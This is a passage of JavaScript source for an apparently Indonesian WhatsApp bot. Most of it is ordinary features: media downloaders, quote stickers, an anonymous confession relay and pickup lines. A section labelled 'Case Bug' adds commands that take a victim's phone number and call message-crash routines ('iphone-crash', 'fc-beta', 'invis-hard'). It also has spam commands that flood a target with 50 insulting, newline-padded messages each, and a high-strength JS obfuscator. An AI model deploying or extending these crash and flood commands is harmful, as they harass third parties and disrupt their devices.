    if (!isBotAdmins) return reply("❌ Bot harus menjadi admin untuk menjalankan perintah ini.");

    const teks = m.quoted ? m.quoted.text : text;
    if (!teks) return reply(`Example: ${prefix + command} teks atau reply ke pesan.`);

    const member = groupMetadata?.participants?.map(p => p.id) || [];

    try {
        await danzy.sendMessage(m.chat, {
            text: teks,
            mentions: member
        }, { quoted: m });
    } catch (err) {
        console.error("Error hidetag:", err);
        reply("❌ Gagal mengirim pesan.");
    }
}
break

// Case Bug  //

case 'flow-ui': {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DanzyReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await danzyblanknew(target);
await danzyblank(target);
danzy.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'flow-blank': {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DanzyReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await danzyblanknew(target);
await danzyblank(target);
danzy.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'iphone-crash': case 'iphone-crash-home': {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DanzyReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await ForcloseWihope(target);
danzy.sendMessage(from, {react: {text: "🩸", key: m.key}})
}
break

case 'fc-beta': {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DanzyReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await FcBeta(target);
danzy.sendMessage(from, {react: {text: "🩸", key: m.key}})
}
break

case 'invis-hard': {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DanzyReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await XmodsDelay1(target);
danzy.sendMessage(from, {react: {text: "🩸", key: m.key}})
}
break

case "clearbug":
        {
          if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 3; i++) {
            await danzy.sendMessage(target, {
              text: "𝗫𝗠𝗢𝗗𝗦 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝗫𝗠𝗢𝗗𝗦 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂",
            });
          }
          reply("*\`𝗗𝗢𝗡𝗘 𝗖𝗟𝗘𝗔𝗥 𝗕𝗨𝗚𝗦!!!\`*");
        }
        break
        
        case "spamripper":
        {
if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 50; i++) {
            await danzy.sendMessage(target, {
              text: "𝐖𝐎𝐈 𝐑𝐈𝐏𝐏𝐄𝐑 𝐊𝐎𝐍𝐓𝐎𝐋\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐌𝐈𝐒𝐊𝐈𝐍 𝐓𝐎𝐋𝐎𝐋",
            });
          }
          reply(`*\`𝗗𝗢𝗡𝗘 𝗦𝗣𝗔𝗠 𝗥𝗜𝗣𝗣𝗣𝗘𝗥 𝗧𝗢 ${pepec}\`*`);
        }
        break
        
        case "spamyatim":
        {
          if (!isOwner && !isAccDanzyDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs 𝙿𝚁𝙴𝙼𝙸𝚄𝙼');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 50; i++) {
            await danzy.sendMessage(target, {
              text: "𝐖𝐎𝐈 𝐘𝐀𝐓𝐈𝐌\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐘𝐀𝐓𝐈𝐌 𝐃𝐎𝐍𝐆𝐎",
            });
          }
          reply(`*\`𝗗𝗢𝗡𝗘 𝗦𝗣𝗔𝗠 𝗬𝗔𝗧𝗜𝗠 𝗧𝗢 ${pepec}\`*`);
        }
        break
        
        case 'enchard': {
    if (!m.quoted) return reply("Reply filenya .js");
    if (mime !== "application/javascript") return reply("Reply filenya .js");
    let a = await m.quoted.download(),
        b = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${b}.js`, a);
    await reply("Memproses encrypt hard code . . .");

    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${b}.js`).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const c = "素晴座素晴難DanzyDev素晴座素晴難" + "素晴座素晴難DanzyGanteng素晴座素晴難",
                d = x => x.replace(/[^a-zA-Z座DanzyDev素Crasher素晴]/g, ''),
                e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
            return d(c) + e(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1,
        shuffle: { hash: 0, true: 0 },
        stack: true,
        controlFlowFlattening: 1,
        opaquePredicates: 0.9,
        deadCode: 0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async f => {
        await fs.writeFileSync(`./@hardenc${b}.js`, f);
        await danzy.sendMessage(
            m.chat,
            { document: fs.readFileSync(`./@hardenc${b}.js`), mimetype: "application/javascript", fileName: b, caption: "Encrypt File JS Sukses! Type:\nString" },
            { quoted: m }
        );
    }).catch(g => reply("Error :" + g));
}
break;

//============= [ BATAS CASE BUG ] ==========//

  case "play": case "dplay": {
    if (!text) return reply('we dont talk')
    await danzy.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })

    let ytsSearch = await yts(text)
    const anuan = ytsSearch.all
    if (!anuan.length) return DanzyReply("Tidak ditemukan hasil untuk pencarian tersebut!")

    let teksnya = "📽 *Hasil Pencarian YouTube*\n\nPilih salah satu untuk mendengarkan atau menonton:"
    
    let sections = []
    let addedTitles = new Set()

    for (let res of anuan.slice(0, 7)) {
        let title = res.title
        let channel = res.author.name || "Unknown"
        let duration = res.timestamp
        let views = res.views
        
        if (!addedTitles.has(title)) {
            sections.push({
                "title": title, 
                "rows": []
            })
            addedTitles.add(title)
        }

        let sectionIndex = sections.findIndex(sec => sec.title === title)

        sections[sectionIndex].rows.push({
            "title": "🎶 Play Audio",
            "description": `📢 ${channel} • ⏳ ${duration}`,
            "id": `.xytmp3 ${res.url}`
        })
        sections[sectionIndex].rows.push({
            "title": "📺 Play Video",
            "description": `📢 ${channel} • ⏳ ${duration}`,
            "id": `.xytmp4 ${res.url}`
        })
    }

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true }}, 
                    body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }), 
                    footer: proto.Message.InteractiveMessage.Footer.create({ text: "Danzy" }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "single_select",
                            "buttonParamsJson": `{ "title": "Pilih Opsi", "sections": ${JSON.stringify(sections)} }`
                        }]
                    })
                }) 
            } 
        }
    }, { userJid: m.sender, quoted: PayX }) 

    await danzy.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id })
}
break

//--------------------------------------------------------------------//
case 'aiimage': {
    if (!text) return reply(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);

    reply("🎨 Generating AI Image...");

    try {
        const axios = require("axios");

        async function generateImage(prompt) {
            const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;

            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
            };

            let { data } = await axios.get(url, { headers });
            if (data && data.image_link) return { success: true, imageUrl: data.image_link };
            return { success: false, message: "❌ Gagal mendapatkan gambar!" };
        }

        let result = await generateImage(text);
        if (!result.success) return m.reply(result.message);

        await danzy.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        await danzy.sendMessage(m.chat, { 
            image: { url: result.imageUrl }, 
            caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
        }, { quoted: m });

        reply("✅ Gambar berhasil dibuat!");
    } catch (err) {
        console.error(err);
        reply("❌ Terjadi kesalahan saat membuat gambar!");
    }
} 
break

case "idch": {
if (!text) return reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await danzy.newsletterMetadata("invite", result)
let teks = `
*ID :* ${res.id}
*Nama :* ${res.name}
*Total Pengikut :* ${res.subscribers}`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `${footer}`,
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Id\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await danzy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "qc": {
    if (!text) return reply('teksnya')

    let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
    let ppuser
    try {
        ppuser = await danzy.profilePictureUrl(m.sender, 'image')
    } catch (err) {
        ppuser = 'https://files.catbox.moe/645ulj.jpg'
    }

    let reswarna = warna[Math.floor(Math.random() * warna.length)]
    reply('Tunggu sebentar, sedang membuat quote...')

    const obj = {
        "type": "quote",
        "format": "png",
        "backgroundColor": reswarna,
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [{
            "entities": [],
            "avatar": true,
            "from": {
                "id": 1,
                "name": m.pushName,
                "photo": {
                    "url": ppuser
                }
            },
            "text": text,
            "replyMessage": {}
        }]
    }

    try {
        const json = await axios.post('https://bot.lyo.su/quote/generate', obj, {
            headers: {
                'Content-Type': 'application/json'
            }
        })
        const pngBuffer = Buffer.from(json.data.result.image, 'base64')

        const webpBuffer = await sharp(pngBuffer)
         .resize({
        width: 320,
        height: 320,
        fit: 'contain',
        background: { r: 0, g: 0, b: 0, alpha: 0 }
    })
    .webp()
    .toBuffer()

        // Kirim stiker
        await danzy.sendMessage(m.chat, {
            sticker: webpBuffer
        }, { quoted: m })

    } catch (error) {
        console.error(error)
        reply("Gagal membuat quote. Coba lagi nanti.")
    }
}
break

case 'confess': case 'confes': case 'menfes': case 'menfess': {
    danzy.menfes = danzy.menfes ?? {};
    const session = Object.values(danzy.menfes).find(v => v.state === 'CHATTING' && [v.a, v.b].includes(m.sender));
    if (session) {
        const target = session.a === m.sender ? session.b : session.a;
        await danzy.sendMessage(target, {
            text: `📩 Pesan baru dari @${m.sender.split('@')[0]}:\n\n${m.text}`,
            mentions: [m.sender],
        });
        reply("Pesan diteruskan.");
        return;
    }
    const roof = Object.values(danzy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (roof) return reply("Kamu masih berada dalam sesi menfess");
    if (m.isGroup) return reply("Fitur hanya tersedia di private chat!");
    if (!text) return reply(`Kirim perintah ${prefix + command} nama|nomor|pesan\n\nContoh:\n${prefix + command} ${pushname}|628xxx|Menfess nih`);
    if (!text.includes('|')) return reply("Format salah! Gunakan format: nama|nomor|pesan");

    let [namaNya, nomorNya, pesanNya] = text.split('|');
    nomorNya = nomorNya.replace(/^0/, '62');
    if (isNaN(nomorNya)) return reply("Nomor tidak valid! Pastikan hanya menggunakan angka.");

    const yoi = `Hi ada menfess nih buat kamu\n\nDari: ${namaNya}\nPesan: ${pesanNya}\n\nKetik:\n${prefix}balasmenfess -- Untuk menerima menfess\n${prefix}tolakmenfess -- Untuk menolak menfess\n\n_Pesan ini dikirim oleh bot._`;
    const tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg');

    const id = m.sender;
    danzy.menfes[id] = {
        id,
        a: m.sender,
        b: `${nomorNya}@s.whatsapp.net`,
        state: 'WAITING',
    };

    await danzy.sendMessage(`${nomorNya}@s.whatsapp.net`, { image: tod, caption: yoi });
    reply("Pesan berhasil dikirim ke nomor tujuan. Semoga dibalas ya!");
}
break

case 'balasmenfess': {
    danzy.menfes = danzy.menfes ?? {};
    const roof = Object.values(danzy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("Belum ada sesi menfess");

    const room = Object.values(danzy.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");

    const other = [room.a, room.b].find(user => user !== m.sender);
    room.b = m.sender;
    room.state = 'CHATTING';
    danzy.menfes[room.id] = { ...room };

    await danzy.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini._\n\n*NOTE:* Ketik .stopmenfess untuk berhenti.`,
        mentions: [m.sender],
    });
    reply("Menfess diterima, sekarang kamu bisa chat!");
    reply("Silakan balas pesan langsung di chat ini. Semua pesan akan diteruskan.");
}
break

case 'tolakmenfess': {
    danzy.menfes = danzy.menfes ?? {};
    const roof = Object.values(danzy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("Belum ada sesi menfess");

    const other = [roof.a, roof.b].find(user => user !== m.sender);
    await danzy.sendMessage(other, {
        text: `_Maaf, @${m.sender.split("@")[0]} menolak menfess kamu._`,
        mentions: [m.sender],
    });
    reply("Menfess berhasil ditolak.");
    delete danzy.menfes[roof.id];
}
break

case 'stopmenfess': {
    danzy.menfes = danzy.menfes ?? {};
    const find = Object.values(danzy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!find) return reply("Belum ada sesi menfess");

    const to = find.a === m.sender ? find.b : find.a;
    await danzy.sendMessage(to, {
        text: "_Sesi menfess ini telah dihentikan._",
        mentions: [m.sender],
    });
    reply("Sesi menfess dihentikan.");
    delete danzy.menfes[find.id];
}
break

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return reply("dengan reply/kirim vidio");
const vid = await danzy.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await danzy.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

case "ytmp4": {
if (!text) return reply("linknya");
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await danzy.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mediafire": {
if (!text) return reply("linknya");
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await danzy.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": {
if (!text) return reply("linknya");
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danzy.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return reply("capcut");
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return reply("linknya");
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danzy.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return reply("linknya");
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danzy.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return reply("linknya");
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await danzy.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return reply("url");
if (!text.startsWith("https://")) return reply("url")
await tiktokDl(q).then(async (result) => {
await danzy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: danzy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await danzy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await danzy.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await danzy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Skyzo-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



// FITUR REACTION CHANNEL

case "reactionch":
case "reactch": {
    if (!isOwner)
        return reply("Fitur ini khusus untuk Owner!");

    if (!text || !args[0] || !args[1]) {
        return reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 😂");
    }

    if (!args[0].includes("https://whatsapp.com/channel/")) {
        return reply("Link tautan tidak valid");
    }

    try {
        let urlParts = args[0].split('/');
        if (urlParts.length < 6) return reply("Link channel tidak lengkap");

        let result = urlParts[4]; // ID channel
        let serverId = urlParts[5]; // ID pesan (message ID)

        let res = await danzy.newsletterMetadata("invite", result);
        await danzy.newsletterReactMessage(res.id, serverId, args[1]);

        reply(`✅ Berhasil mengirim reaction ${args[1]} ke dalam channel *${res.name}*`);
    } catch (e) {
        console.error(e);
        reply("❌ Gagal mengirim reaction. Pastikan link dan emoji benar, serta bot memiliki izin.");
    }
}
break

case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
